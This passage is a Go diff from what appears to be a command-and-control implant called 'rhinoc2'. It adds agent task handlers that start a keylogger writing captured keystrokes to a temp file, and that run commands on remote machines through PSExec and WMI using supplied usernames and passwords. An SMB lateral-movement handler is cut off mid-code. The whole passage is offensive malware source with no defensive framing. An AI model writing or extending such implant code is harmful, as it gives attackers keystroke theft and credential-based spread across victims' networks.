@@ -248,3 +248,53 @@ func (a *Agent) handleTask(task map[string]interface{}) {
 		}
 
 	case "keylog_start":
+		logPath := commands.GetTempDir() + "/rhinoc2_keylog.txt"
+		if args != "" {
+			logPath = args
+		}
+		keylog := postexploit.NewKeylogger(logPath)
+		err := keylog.Start()
+		if err != nil {
+			result = "keylogger start failed: " + err.Error()
+		} else {
+			result = "keylogger started, logging to: " + logPath
+		}
+
+	case "keylog_stop":
+		result = "keylogger stopped"
+
+	case "keylog_dump":
+		result = "keylog dump not implemented"
+
+	case "lateral_psexec":
+		parts := strings.Split(args, "|")
+		if len(parts) >= 4 {
+			lm := postexploit.NewLateralMovement()
+			err := lm.PSExec(parts[0], parts[1], parts[2], parts[3])
+			if err != nil {
+				result = "PSExec failed: " + err.Error()
+			} else {
+				result = "PSExec executed on " + parts[0]
+			}
+		} else {
+			result = "usage: lateral_psexec target|username|password|command"
+		}
+
+	case "lateral_wmi":
+		parts := strings.Split(args, "|")
+		if len(parts) >= 4 {
+			lm := postexploit.NewLateralMovement()
+			err := lm.WMIExec(parts[0], parts[1], parts[2], parts[3])
+			if err != nil {
+				result = fmt.Sprintf("WMI exec failed: %v", err)
+			} else {
+				result = "WMI executed on " + parts[0]
+			}
+		} else {
+			result = "usage: lateral_wmi target|username|password|command"
+		}
+
+	case "lateral_smb":
+		parts := strings.Split(args, "|")
+		if len(parts) >= 4 {
+			lm := postexploit.NewLateralMovement()
